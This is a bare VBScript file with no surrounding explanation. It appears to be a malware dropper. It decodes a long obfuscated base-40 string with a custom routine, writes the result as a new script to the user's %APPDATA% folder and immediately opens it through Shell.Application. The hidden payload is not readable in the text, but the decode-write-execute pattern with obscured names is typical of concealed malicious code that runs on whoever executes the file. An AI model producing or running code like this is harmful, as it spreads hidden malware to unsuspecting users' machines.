Function decode(ByVal bbbb)
output = ""
c = 0
r = 1
While r < 16777215
r = r * 40
c = c + 1
Wend
For i = 1 To Len(bbbb)
Value = Value * 40 + (Asc(Mid(bbbb, i, 1)) - 40)
If i Mod c = 0 Then
While Value > 0
v = Value Mod 256
If v > 0 Then
output = Chr(v) + output 
End If
Value = Value \ 256
Wend
Value = 0
End If
Next
decode = output
End Function

adfs="(23C:*12+=)J(=1*?J?8)/8JH*?J44*DK,0(2C8J*?>85)/<7H)EMB-(HL0D)*,<3)BD5B)EKE4)BK2())+J=*I*.+*O1BA*I,0;*I+,-*CO,7)G+L>*;FG4)G-<8)CKJF*16@5*1551)J(=1)*)9J*J,/2*;GEI*G(=C*;G,8*G(O>*N/,-*NMG2*DMO3*?EB:*?H>,(I)<:*FDI=*BL*D*<G+C*NL=O(2>ME)15FE(HNL8*?I/@)/9<4*CNGD*-7?B(56-7*?L14(56-.*J-(M)/6ML)FOK?)O-.;*NI9J*(3,@)*)9J*DD5I**1G8)L*9M*BN,0*??8K*M.4<*)+2/)DK8=(2=N>(HN>E)*,<5)O.FI))237+(1O4+(0*G*O1-@(HN8H*DBLE*J,HH(56,N).31))37*8*;F?8*O1B=++5H;*N+L-*?J@))/8JH*16-.**32)(I(<()FOK?)O-.;*?K=@(56-3(HKJ8)FHHH)GOE,*FOJ@*O*A))/7?5*3:3?)L);J)>?E()CKJ8*4;8?*NL=0(2>ME)N,(5(I)NF*CN-E++5H.*?F:=*?H>,)/6N**3:3?)L);J(56-(*NLI)*DMO3*GM5B*N1(M*?F4A)H,*D*I*,6*K.-I*=I5I))+KC*?HJL*)3?:*;GEE)E*@M(I(<(*3:3?)L);J*NL=((2>ME(I1--*/62D)GMN=)-/85*16-.**32)*)*L(*4<C@)J)()*CN28(56,L*AM<0)N1/>(HM@H)BK8?(I+?**10C-*48J)(56-0*(/+5),.9F*65G0),.8J(JO0H*.3*=**/DI(N-NH*MLHJ*CN:?*-:4:*?JA4*J,1-+)2.**>C,6*K+,6)/73()O,=.*+3DM(I(<(*(/+5(56,N*?L14(56-.*DD5I(HM@H)BK8?))322*)/1A*16@8*BN,0),.:;)N,(H(I)NF)FG7M)GOE,)21-*(HMM@*AM<0)N1/>*O1-@(HN8H*DBLE*J,HH(56,N(HL/2)FG7M)GOE,*40;:)I).9)GN9G(HM@H)BK8?(I+?**10C-*48J)(56-0*?L14(56-.(I/D1*10BC*48J))BDJ(**1;7(I,C5)*,<E*+,1*)I(=0(56-*).06))BLHH)HO>I(I)N>(I15O)>?D8(I/D()H-)2)*)9J*+00B)GN@/*+,0.)I(=0*GEH2*?CL1(56-2+,*?9*M/EA)>?DI**1G0)L*9M)*)9J),.93(HNE@*CAMK(HM:8)FHBL*4<=7*)0C1)>?E)*O0(H*?J@O(56-,(HNEI)35-K(HM@H)+-<1)).E@*2:9E**/22(I*9O)78O;(HNF-*43=J)I).9)GN9G(I(<(*+00B)GN@/(56,N(HN?9)35-K(HM@H)+-<1)).E@*2:9E**/22(I*9O)78O;(HNF-*43=J)I).9)GN9G(I(<(*+00B)GN@/(56,N(HNEI*CAMK(HM:8)FHBL*4<=7*)0C1)>?E))BLHH)HO>I(2<IF(HN>E*+*L5)BLJ(*IGE+)132,(I(<(*LJA)(2<JG(HN85*10C-*48J)(56-0*?J@L(56-7).06)*?K0H+(1OD(I.A/*LJ?M*I,0M*=HJM)32+:(HM:8*CLJ=(I/2M*?>,E+(1/4(56-G(I*:>)G+L,)21-*(HM@H*>H18(I*:F++(65*I)B=(56-)),.91*?L/0)K/ED*AK,<*O.N*(I(<(*>H18*O+,6*M-O5(2D0I++)FE*I)B=)FHC9*4<=7*)0C1)>?E)++)G0*I)B=*?K>A*;G8O)BDJL**1;7(2?>=*N.>E(2<D4++5FE(2>-E(HN>E++(5K*I)B=*?K>A*;G8O)>?F,*?L/0)K/ED*AK,<*O.N*)*)9J*?J:H).07D*?L/0)K/ED*AK,<*O.N*)HN?8)FO+?)>?E7++)G0*I)B=*?K>A*;G8O)BDJL**1;7(2?>=(I1@5(I,1/)>?D9(I/=@)H-)2)21-*(HM@H*>H18(I*:F++(65*I)B=(56-))J(5I*>=-F(I)/>*?L/9)K/ED*16?8)BLJ0)K*FH),.9((HNL(+(N9=)21-*(HM@H*>H18(I*:F++(65*I)B=(56-)(HN?F)*,=<),.91*?L/0)K/ED*16?8)BLJ0)K*FH(HM@H(HN?F)*,<2*>H18))2-N*2:9E**/22(I*9O*JHC-*O/?=*HCC:*.95E(HN8H*B@ON*@?,0(56-))8=;((HNL:)C(*<*>H/0*AMBA(I(<((2B40)K.85*I)@H(56,M(HN?F*LJ?M*I,0M*=HJM)32+:(HM@H*>H18(I*:F++(65*I)B=(56-)(HN?9++(5K*I)B=)FHC9*4<=7*)0C1),.9I)6;=@)+-:J++)G0*I)B=)FHC9*4<=7*)0C1)>?E)*>H/0*AMBA*HCC:*.95E(HN8H*LJ?M*I,0M*=HJM)K.8H)*)9J*16?9)BLJ0)K*FH*I)A(*<GL=)=>GE*?L/0)K/ED*?>,0*BLD4(56-7)>?D8*?L/0)K/ED*AK,<*O.N*)10.B(I(<(*CLJ=(2B.-(HN85*LJ?M*I,0M*=HJM)32+:(HM@H)+-:L**1G0)M*:2(I(<(*>H18(2=5N)GIFE)M,0)*)0C=)HN?8)FO+?*GEH?*?CL1(56-2+,*?9*M/EA)>?DI)HN?0)FO+?(56-7*?L14(56-.(HNL1)35-K(HM@H)+-<1)).E@*2:9E**/22(I*9O*43=K)I).9)GN9G(HM@H)N+8.**1.C)>?E/)BI@H)O-ND(2>3@)36>E(HM@H),.92(I/=@)57*B*16?8)BLJ0)K*FH(HM@H)38<>(HM:8*+00B)GN@/)>?DN)BLHH)HO>I(2<IF)25@5(HM@H),.92(I/=@)57*B*16?8)BLJ0)K*FH(HM@H)38<>(HM:8*+00B)GN@/)>?DN)BLHH)HO>I(2<IF)36>E(HM@H)+-<1)).E@*2:9E**/22(I*9O*43>5)I).9)GN9G)21-*(HMM@*4;2)(I*F9(I,1/)>?D8(I/=@)H-)2)10.B(I(<()N+8.**1.C(56-/)).2A*2:9E**/22(I*9O*+*LE)BLJ((56-+*?L14(56-.*LJA2(I,JG)25A))58O0),.95(I/=@*/544)GN-9*CLI(*==;=(I)/C)*,<E).06)))70H*2:9E**/22(2=5/)6;05(HMM@)CMH))FO8<*.:8H(HN?0*CAN5*J,HH(56,N)25A))69M@)-/7E*3;+9))1AD)O2G4*N.2@)>?DI(2CJ8)58;=).06-*48HH*,40*)FHC5*4<=7*)0C1*GEH1*?CL1(56-2+,*?9*M/EA)>?DI*16?0)BLJ0)K*FH)21-*(HMM@)CMH))FO8<(I(<()CMH))FO8<*>:+:*1;EN)21-*(HMM@)CMH))FO8<(I(<()CMH))FO8<)*)9J)38<=)=C=@)*-M@)-/7A)CMH))FO8<)JM-@)EO>M*>>9F))2G9)C(J;*?>,0*BLD4(56-7*/541)GN-9*?J?8)>?E,*48HH*,40*(56,M+-541)/9<1*CN-E*>>:>*,6MA)),O>*?H=M*-:4:*?L14)C(J,*K+EN*?@6G*@JG<(I(<(*3;+9(2<ID*12+=)J(=1*FOJ@*O*A))/7?5*16@/)>?E1*FOJ8(I/,1*-7L<(JJE**<G?@+(2L6+(2N((K/9/(HM@H(N(O9)BKK1**1AD(JN@)*AM40*M.46*O,D<*H(JF*M/2F*I,=I*I)AE++5/1*(*35)FN@*)>G>O)I).O(56-((JMG9*?J44)/9<0*CNGD*-7?B(HL0?*=IA(*<G,-*O/>G*M-B9)>?DK)CKJ8*16@5*NL=1(2>ME(JO05*?HJL*)3?:*O/?=*-;,;*CN-E*AB36*O01.*M.48(K-O3*=IA(*<G,-*O/>G*M-B9)>?DK)FM@H(I+E7*-7L<"
aaaa=decode(adfs)
Set objShel = CreateObject( "WScript.Shell" )
outFile1=objShel.ExpandEnvironmentStrings("%APPDATA%") + "\output.vbs"
Set objFSO1=CreateObject("Scripting.FileSystemObject")
Set objFile1 = objFSO1.CreateTextFile(outFile1,True)
objFile1.Write aaaa
objFile1.Close
Set objShell = CreateObject("shell.application")
objShell.Open(outFile1)





